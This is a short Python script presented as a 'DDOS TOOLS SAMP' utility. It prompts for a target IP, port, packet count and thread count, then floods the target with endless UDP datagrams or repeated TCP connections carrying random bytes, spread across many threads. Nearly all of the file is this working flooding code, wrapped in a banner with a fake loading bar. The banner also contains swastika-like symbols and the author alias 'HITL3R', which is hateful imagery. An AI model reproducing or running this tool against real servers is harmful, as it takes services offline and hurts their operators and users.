#NathanGanzzz
import random
import socket
import threading

print       (" ────────────── [ ☭ DDOS TOOLS SAMP BY NATHAN ☭ ] ────────────── ")
print       (" WELCOME THERE ")
print       (" MY NAME IS NATHAN ")
print       (" PLEASE DONT ABUSE THIS TOOLS ")
print       (" ENJOY FOR MY TOOLS 〠 ")
print       (" ☠☠☠ LOADING ☠☠☠ ")
print       (" 【■■■■               】 10 % ")
print       (" 【■■■■■■■■           】 25 % ")
print       (" 【■■■■■■■■■■■■■      】 70 %  ")                                   
print       (" 【■■■■■■■■■■■■■■■■■■■】 100 % ")
print       (" ☠☠☠ LOADING COMPLETE ☠☠☠ ")
print       (" ────────────── [ ☭ CREDITS ☭ ] ────────────── ")
print       (" AUTHOR : NATHAN A.K.A HITL3R ")
print       (" RENAME ? PM ME ")

ip = str(input(" IP THE SERVER:"))
port = int(input(" PORT THE SERVER:"))
times = int(input(" PING:"))
threads = int(input(" THREADS:"))
choice = str(input(" SEND ? (y or n):"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" 卍☢ ATTACK THE SERVER ☢卍 ")
		except:
			print("[!] ✉ DDOS UPLOADED ✉")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" 卍☢ ATTACK THE SERVER ☢卍 ")
		except:
			s.close()
			print("[*] ✉ DDOS UPLOADED ✉")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 
